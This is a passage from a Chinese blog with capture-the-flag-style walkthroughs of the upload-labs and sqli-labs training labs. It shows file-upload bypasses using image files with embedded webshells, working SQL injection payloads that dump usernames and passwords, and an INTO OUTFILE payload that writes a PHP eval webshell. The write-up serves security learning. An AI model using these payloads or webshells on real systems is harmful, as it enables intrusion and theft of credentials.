<p>注：索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM。</p>
<p>而这个函数是通过文件头来判断（<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html">关于这个函数的具体用法</a>）所以这题我们还是可以用修改文件头来绕过。</p>
<p><img src="upload-labs-wp/31.jpg"></p>
<p>可以看到上传成功。</p>
<p><img src="upload-labs-wp/30.jpg"></p>
<p>访问也成功。</p>
<p><img src="upload-labs-wp/27.jpg"></p>
<p>连接也成功。</p>
<p>当然，这题用<strong>图片马</strong>也能成功。</p>
<hr>
<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><h2 id="解题-14"><a href="#解题-14" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里与上题不同的是，用了exif_imagetype()函数</p>
<p><img src="upload-labs-wp/33.jpg"></p>
<p>查看手册可以知道这个函数和less-14的函数作用差不多，并且这题还是有文件包含漏洞，所以解法与less-14相同，采用图片马直接秒杀，这里用修改文件头的话，上传会失败。</p>
<hr>
<h1 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h1><h2 id="解题-15"><a href="#解题-15" class="headerlink" title="解题"></a>解题</h2><p>查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从代码中可以看到，这题综合了多方面的过滤。这题用$_FILES函数获得上传文件的基本信息，文件名，类型，大小，临时文件路径。判断了文件名，所以我们要修改content—type；接着yongimagecreatefrom(）函数对图片进行二次渲染，重新命名。<br>注：imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。</p>
<p>该系列函数有：</p>
<p><strong>imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br>imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br>imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像<br>imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像<br>imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像</strong></p>
<p>二次渲染意味着文件的十六进制编码重新打乱，而我们之前写入的一句话木马也可能会没有。</p>
<p>这里我测试一下gif图片上传，首先制作一个gif图片马</p>
<p><img src="upload-labs-wp/35.jpg"></p>
<p>可以看到文件末尾有一句话木马。</p>
<p><img src="upload-labs-wp/34.jpg"></p>
<p>上传成功，接着查看一下上传成功后的图片马。</p>
<p><img src="upload-labs-wp/36.jpg"></p>
<p>可以看到，文件末尾的一句话木马没了，这就是二次渲染的效果。</p>
<p>通过notepad++的Compare插件发现，原图和二次渲染图在文件开始的字节中内容是相同。</p>
<p><img src="upload-labs-wp/37.jpg"></p>
<p>所以这里可以考虑将一句话木马插到文件开头几个字节中，这样就可以避免二次渲染给清除掉。</p>
<p><img src="upload-labs-wp/38.jpg"></p>
<p><img src="upload-labs-wp/41.jpg"></p>
<p>将改写好的图片文件重新上传成功。</p>
<p><img src="upload-labs-wp/40.jpg"></p>
<p>访问成功。</p>
<p><img src="upload-labs-wp/39.jpg"></p>
<p>连接成功。</p>
<h2 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h2><p><strong>文件加载检测（图像渲染，二次渲染）绕过</strong></p>
<p>渲染绕过：先用 GIMP 对一张图片进行代码注入<br>用 winhex 看数据可以分析出这类工具的原理是 在不破坏文件本身的渲染情况下找一个空白区进行填充代码 一般是图片的注释区</p>
<p>最简单的绕过就是利用gif图片马，而png，jpeg图片马则相对更难。</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657">具体绕过姿势参考</a></p>
<hr>
<h1 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h1><h2 id="解题-16"><a href="#解题-16" class="headerlink" title="解题"></a>解题</h2></script></p></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en"><link itemprop="mainEntityOfPage" href="http://example.com/2021/02/17/sql-libs-wp/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.gif"><meta itemprop="name" content="John Doe"><meta itemprop="description" content=""></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Hexo"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2021/02/17/sql-libs-wp/" class="post-title-link" itemprop="url">sql-libs-wp</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">Posted on</span> <time title="Created: 2021-02-17 15:19:38" itemprop="dateCreated datePublished" datetime="2021-02-17T15:19:38+08:00">2021-02-17</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">Edited on</span> <time title="Modified: 2021-03-02 14:34:07" itemprop="dateModified" datetime="2021-03-02T14:34:07+08:00">2021-03-02</time></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="less-1（GET-Error-based-String）"><a href="#less-1（GET-Error-based-String）" class="headerlink" title="less-1（GET-Error based-String）"></a>less-1（GET-Error based-String）</h1><p>首先判断是字符型还是数字型注入。输入<code>?id=1’</code>，发现报错，直接报的数据库的错;接着输入<code>?id=1’ or 1=1–+</code>，注释掉单引号，正常显示；输入<code>?id=1’ and 1=2–+</code>，回显错误。所以判断这是字符型注入。</p><p>接着查询字段输入<code>?id=1’ order by 10–+</code>回显错误；<code>?id=1’ order by 5–+</code>回显错误；<code>?id=1’ order by 4–+</code>回显错误；<code>?id=1’ order by 3–+</code>回显正常，所以由3个注入字段。</p><p><img src="/2021/02/17/sql-libs-wp/2.png"></p><p>接着用union函数确定显示的字段位置，输入<code>?id=1’ union select 1,2,3–+，</code>可以看到页面成功执行，但是没有返回union select的结果。百度后得知这些题目使用了mysql_fetch_array()这个函数，且没有循环操作，所以只执行一次mysql_fetch_array()，只能返回一条数据。大部分程序只会调用数据库查询的第一条语句进行查询然后返回（这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。所以把id设置为不存在的id，就会回显union所连接的结果，比如设置id=-1或者0.且只有2,3位置可以注入，或者在id=1 后面加上and1=2，也可使第一条查询语句为错。</p><p><img src="/2021/02/17/sql-libs-wp/3.png"></p><p>接着查询数据库信息，**输入<code>?id=-1’ union select 1,database(),3–+</code>**可以得到数据库名字为security。</p><p>接着爆表，**<code>?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</code>**阅读其他大佬wp后了解到还可以<code>?id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3–+</code>或者用limit一步一步爆<code>?id=-1’ union select 1,(select table_name from information_schema.tables where table_schema=‘security’ limit 0,1),3–+</code></p><hr><p>注1：limit在mysql中是用来分页的，通过他可以从查询出来的数据中获取我们想要的数据</p><p>limit语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT [offset] rows | rows OFFSET offset</span><br></pre></td></tr></table></figure><p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，初始记录行的偏移量是 0(而不是 1)。</p><p>注2：版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。</p><p>注3：也可通过下面的语句可以判断数据库版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(mid(version(),1,1))&gt;51</span><br></pre></td></tr></table></figure><p>解释1： 确认数据库版本， 51是ASCII码3 正确则&gt;4.0 错误则&lt;4.0，当版本大于3.0时才能使用union方法；<br>解释2：ord()是mysql的函数用于获取二进制码；<br>解释3：mid()是mysql的函数用于截位操作；<br>解释4：version()是mysql的函数用于获取当前数据库的版本；</p><hr><p>其中的users表很可能就是目标。</p><p><img src="/2021/02/17/sql-libs-wp/.png">接着爆表列的字段，**<code>?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘users’–+</code>** 出现3个字段。</p><hr><p>注3：在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表。</p><p>方法一:</p><p>用group_concat它可以返回查询的所有结果，因为我们需要通过命名判断该我们需要的敏感数据。</p><p>group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据group by指定的列进行分组。</p><p>方法二:</p><p>使用下面的语句也是可以查出来的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select null,table_name,null from information_schema.tables where table_schema&#x3D;&#39;security&#39;</span><br></pre></td></tr></table></figure><p>注4：在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure><p>最后输入：<code>?id=-1’ union select 1,group_concat(id,username),group_concat(password) from users–+</code>得到数据</p><p><img src="/2021/02/17/sql-libs-wp/5.png"></p><hr><h1 id="less-2（GET-Error-based-Intiger-based）"><a href="#less-2（GET-Error-based-Intiger-based）" class="headerlink" title="less-2（GET-Error based-Intiger based）"></a>less-2（GET-Error based-Intiger based）</h1><p>首先确定是哪种类型的注入，输入?id=1’，报错；输入?id=1 or 1=1，显示正常；?id=1 and 1=2，显示不正常，所以存在注入，且为数字型注入，过程与less1相同，只是不用注释单引号。最后的payload与less1也相同。</p><hr><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><p>首先输入<code>?id=1’</code>,结果报错，但不同的是报错内容中显示结尾闭合的单引号后面还有括号闭合，且该题为字符型注入。</p><p><img src="/2021/02/17/sql-libs-wp/6.png"></p><p><img src="/2021/02/17/sql-libs-wp/7.png"></p><p>所以在处理字符型注入时，我们不得不在末尾用–+给注释掉后面的单引号以及括号，但前面查询的字符结尾只有单引号，如<code>id=‘1’</code>，但是该题的末尾还得要）闭合，所以没有<code>）</code>结尾闭合会报错，正确的做法是在单引号后面再加上<code>）</code></p><p><img src="/2021/02/17/sql-libs-wp/8.png"></p><p>后面的步骤与前面相同。</p><hr><h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p>首先输入<code>?id=1&#39;</code>结果回显正确，按理来说如果单引号为奇数不成对的话是会报错的，所以猜测查询的id值是用其他符号引用的，试试<code>id=1&quot;</code>结果报错，而且报错内容果然是1用双引号闭合的，并且末尾还有括号闭合,且该题为字符型注入。</p><p><img src="/2021/02/17/sql-libs-wp/9.png"></p><p><img src="/2021/02/17/sql-libs-wp/10.png"></p><p>所以<code>?id=1”)--+</code>查询的结果为正确的。</p><p><img src="/2021/02/17/sql-libs-wp/11.png"></p><p>后面的步骤相同。</p><hr><h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><p>首先试试看是什么注入,输入id=2’</p><p><img src="/2021/02/17/sql-libs-wp/19.png"></p><p>接着将闭合的单引号注释掉，发现这是字符型注入</p><p><img src="/2021/02/17/sql-libs-wp/20.png"></p><p>回显没有报错，但是与前面题目不同的是，这只能提示正确与错误，却无法看到具体数据。</p><p>这里可以利用<strong>extractvalue</strong>这个报错函数，前提是得要有报错信息。</p><p>首先查看数据库信息payload=<code>?id=1%27 and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+</code> 其中这里的0x7e可以用‘~’代替。</p><p><img src="/2021/02/17/sql-libs-wp/21.png"></p><p>接着可以用相同的方法爆库名，payload=<code>?id=1%27 and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata),0x7e)) --+</code></p><p><img src="/2021/02/17/sql-libs-wp/22.png"></p><p>回显有报错，提示回显最多只能显示一行，所以这里可以用limit一点一点地爆</p><p><img src="/2021/02/17/sql-libs-wp/13.png"></p><p>结果在第四个字段爆出熟悉的security，接着爆该库中的表名，payload=<code>?id=1%27 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),0x7e)) --+</code></p><p><img src="/2021/02/17/sql-libs-wp/23.png"></p><p>同样在第三个字段中爆出熟悉的users表，接着爆该表中的字段</p><p><img src="/2021/02/17/sql-libs-wp/15.png"></p><p><img src="/2021/02/17/sql-libs-wp/16.png"></p><p><img src="/2021/02/17/sql-libs-wp/17.png"></p><p>同样在不同的字段中爆出了熟悉的id，username，password列，最后就是爆数据了，payload=<code>?id=1%27 and extractvalue(1,concat(0x7e,( select concat(id,0x7e,username,0x7e,password) from users limit 0,1),0x7e)) --+</code></p><p><img src="/2021/02/17/sql-libs-wp/18.png"></p><p>改变limit可以一点一点爆出所有数据。</p><hr><p>注：能利用的爆错函数还有很多，如：</p><p>报错函数 数据库版本<br>extractvalue 5.1.60、5.5.29、5.7.26、8.0.12<br>updatexml 5.1.60、5.5.29、5.7.26、8.0.12<br>floor 5.0.96、5.1.60、5.5.29、5.7.26<br>exp 5.5.29<br>GeometryCollection 5.1.60、5.5.29<br>linestring 5.1.60、5.5.29<br>polygon 5.1.60、5.5.29<br>multipoint 5.1.60、5.5.29<br>multipolygon 5.1.60、5.5.29<br>multilinestring 5.1.60、5.5.29</p><hr><h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1><p>首先<code>id=1‘</code>，回显没有报错</p><p><img src="/2021/02/17/sql-libs-wp/24.png"></p><p>按理说会有错误回显，于是试了下<code>id=1“</code>，结果回显报错，从报错结果上看果然是双引号闭合</p><p><img src="/2021/02/17/sql-libs-wp/25.png"></p><p>后面的基本步骤相同，不同的就是要把单引号改为双引号。</p><h1 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h1><p>首先查看注入型，id=1’，结果报错</p><p><img src="/2021/02/17/sql-libs-wp/27.png"></p><p>试试<code>id=1&quot;</code>，结果与<code>id=1</code>相同</p><p><img src="/2021/02/17/sql-libs-wp/28.png"></p><p><img src="/2021/02/17/sql-libs-wp/26.png"></p><p>都显示出use outfile，百度后知道这是写入文件注入，并且根据对比得出这是由单引号闭合的。接着试试<code>id=1’ --+</code>结果居然还是报错。</p><p><img src="/2021/02/17/sql-libs-wp/29.png"></p><p>试试有没有括号闭合<code>id=1’) --+</code></p><p><img src="/2021/02/17/sql-libs-wp/30.png"></p><p>还是报错。无奈只好查看一下源代码。</p><p><img src="/2021/02/17/sql-libs-wp/31.png"></p><p>没想到还有一层括号，<code>id=1’)) --+</code>结果正确</p><p><img src="/2021/02/17/sql-libs-wp/32.png"></p><p><strong>outfile，意思是用file权限向服务器中写入文件。</strong></p><p><strong>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在文件的权限。我们必须知道服务器上一个可以写入文件的文件夹的完整绝对路径。</strong></p><p><strong>导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中，sqlmap中也有导出一句话和一个文件上传的页面。</strong></p><p><strong>常用的语句是： <code>select &#39;&lt;?php @eval($_REQUEST[&#39;a&#39;]);?&gt;&#39; into outfile &quot;XXX\\test.php&quot;</code> ，当然这里要获取到网站的在系统中的具体路径（绝对路径）。</strong></p><p>一般web都存放在默认的目录下，比如：</p><ul><li>c:/inetpub/wwwroot/</li><li>linux的nginx一般是/usr/local/nginx/html</li><li>/home/wwwroot/default</li><li>/usr/share/nginx</li><li>/var/www/html</li></ul><p>payload：?id=-1 union select 1,2, “<?php @eval($_POST['a']); ?>“ into outfile “E:\phpstudy\phpstudy_pro\WWW\1.php”–+</p><p>但是本地没有该文件出现，阅读其他人的wp后知道这要先开启secure_file_priv 功能</p><p><strong>secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行load data、into outfile语句和load_file()函数，这些操作需要用户具有file权限。</strong></p><blockquote><ol><li>如果这个参数为空，这个变量没有效果。</li><li><strong>如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它。</strong></li><li>如果这个参数为null，Mysql服务会禁止导入和导出操作。<br><strong>4.secure_file_priv=”/“，代表着可以将文件导出到任意目录去。</strong></li></ol></blockquote><p><img src="/2021/02/17/sql-libs-wp/33.png"></p><p>果然没有开启，在my.ini中加上ecure_file_priv = “路径” 